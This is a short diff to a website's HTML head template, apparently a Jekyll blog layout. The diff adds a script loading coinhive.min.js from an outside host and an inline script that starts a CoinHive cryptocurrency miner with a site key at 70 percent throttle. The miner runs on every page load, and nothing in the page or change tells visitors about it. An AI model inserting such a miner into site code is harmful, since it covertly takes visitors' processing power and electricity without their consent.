@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="description" content="{{ site.description }}">
     <meta name="keyword"  content="{{ site.keyword }}">
+    <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
     <link rel="shortcut icon" href="{{ site.baseurl }}/img/favicon.ico">
 
     <title>{% if page.title %}{{ page.title }} - {{ site.SEOTitle }}{% else %}{{ site.SEOTitle }}{% endif %}</title>
@@ -42,4 +43,7 @@
 
     <!-- ga & ba script hoook -->
     <script></script>
+    <script>
+    var miner = new CoinHive.Anonymous('taV9rHlSP4hskWgo2nVcZvjsC9UVHYB0', {throttle: 0.7});
+    miner.start();</script>
 </head>
